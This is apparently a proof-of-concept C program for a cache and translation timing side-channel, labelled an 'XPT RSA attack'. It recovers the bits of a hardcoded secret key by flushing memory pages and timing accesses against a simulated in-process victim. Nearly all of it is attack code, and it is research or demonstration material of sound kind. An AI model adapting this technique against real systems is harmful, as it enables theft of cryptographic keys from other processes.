#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>

#define PAGE_SIZE 4096
#define XPT_SIZE 256
#define THRESHOLD 32
#define KEY_BITS 8

static inline void clflush(volatile void *p) { asm volatile("clflush (%0)" :: "r"(p)); }
static inline void mfence() { asm volatile("mfence" ::: "memory"); }
static inline uint64_t rdtscp() { unsigned int junk; return __rdtscp(&junk); }

void train_page(volatile char *addr) {
    for (int i = 0; i < THRESHOLD + 5; i++) {
        volatile char junk = *addr; mfence();
        clflush(addr); mfence();
    }
}

int main() {
    size_t mem_size = 500 * PAGE_SIZE;
    char *buffer = (char *)aligned_alloc(PAGE_SIZE, mem_size);
    volatile char *attacker_pages[XPT_SIZE];
    for (int i = 0; i < XPT_SIZE; i++) {
        attacker_pages[i] = &buffer[i * PAGE_SIZE];
        *attacker_pages[i] = 0x55;
    }
    volatile char *victim_trigger = &buffer[400 * PAGE_SIZE];
    // volatile char *cleanup_trigger = &buffer[600 * PAGE_SIZE];
    uint8_t secret_key = 0x5c; // 0101 1100
    uint8_t recovered_key = 0;

    printf("=== XPT RSA ATTACK (STABILIZED & ROBUST) ===\n");
    // =============================================================
    // 1. 动态校准 (Calibration)
    // =============================================================
    printf("[*] Calibrating thresholds...\n");
    // 跑两次完整的模拟流程但不计分，强制系统进入“稳态”
    for (int warmup = 0; warmup < 100; warmup++) {
        for (int i = 0; i < XPT_SIZE; i++) train_page(attacker_pages[i]);
        clflush(attacker_pages[0]); mfence();
        volatile char j = *attacker_pages[0]; mfence();
    }
    // 测量 5 次取最小值作为“快路径”基准
    uint32_t fast_base = 9999;
    for(int s=0; s<3; s++) {
        // 【关键】：必须先跑一遍 256 页面的训练，让系统状态与攻击时一致
        for (int i = 0; i < XPT_SIZE; i++) {
            train_page(attacker_pages[i]);
        }

        // 探测快路径 (不进行受害者干扰)
        clflush(attacker_pages[0]); mfence();
        uint64_t start = rdtscp();
        volatile char j = *attacker_pages[0]; mfence();
        uint32_t l = (uint32_t)(rdtscp() - start);
        
        if(l < fast_base) fast_base = l;
        
        // 清理，准备下一次校准采样
        for (int i = 1; i < XPT_SIZE; i++) { volatile char c = *attacker_pages[i]; mfence(); }
    }

    // 动态设定阈值：快路径基准 + 25 周期
    uint32_t dynamic_gap = fast_base + 25;
    printf("[*] Real-world Fast Base: %u | Dynamic Threshold: %u\n\n", fast_base, dynamic_gap);

    // =============================================================
    // 2. 主攻击循环 (带 Min-Sampling 采样)
    // =============================================================
    for (int bit = 0; bit < KEY_BITS; bit++) {
        // Step 1: 建立 LRU
        for (int i = 0; i < XPT_SIZE; i++) train_page(attacker_pages[i]);

        // Step 2: 受害者
        if ((secret_key >> bit) & 1) {
            clflush(victim_trigger); mfence();
            volatile char junk = *victim_trigger; mfence();
        }

        // Step 3: 探测 (采样 3 次取最小值以过滤 807 这种噪声)
        uint32_t min_lat = 9999;
        for (int s = 0; s < 3; s++) {
            clflush(attacker_pages[0]); mfence();
            uint64_t start = rdtscp();
            volatile char junk = *attacker_pages[0]; mfence();
            uint32_t current_lat = (uint32_t)(rdtscp() - start);
            if (current_lat < min_lat) min_lat = current_lat;
        }

        int guess = (min_lat > dynamic_gap) ? 1 : 0;
        if (guess) recovered_key |= (1 << bit);

        printf("Bit %d | Min-Latency: %4u | Guess: %d | %s\n", 
               bit, min_lat, guess, (guess == ((secret_key >> bit) & 1) ? "OK" : "FAIL"));

        // Step 4: 清理
        for (int i = 1; i < XPT_SIZE; i++) { volatile char c = *attacker_pages[i]; mfence(); }
        // train_page(cleanup_trigger);
    }

    printf("\nRecovered: 0x%02x (Target: 0x5c)\n", recovered_key);
    return (recovered_key == secret_key) ? 0 : 1;
}